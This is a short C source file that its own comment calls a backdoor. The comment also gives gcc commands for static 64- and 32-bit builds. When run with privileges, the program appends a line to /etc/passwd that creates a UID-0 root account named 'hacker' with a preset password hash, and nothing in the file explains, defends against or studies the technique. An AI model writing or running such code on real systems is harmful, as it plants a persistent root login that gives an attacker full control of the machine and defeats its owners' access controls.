/*	
	This backdoor creates a new root user:
		hacker : hacker

	COMPILATION
	gcc -static -o addRoot addRootLin.c
	gcc -static -m32 -o addRoot32 addRootLin.c

*/

#include <stdio.h>

int main()
{
	system("echo \"hacker:XtrtcvpiHNHqo:0:0:root:/root:/bin/bash\" >> /etc/passwd");
}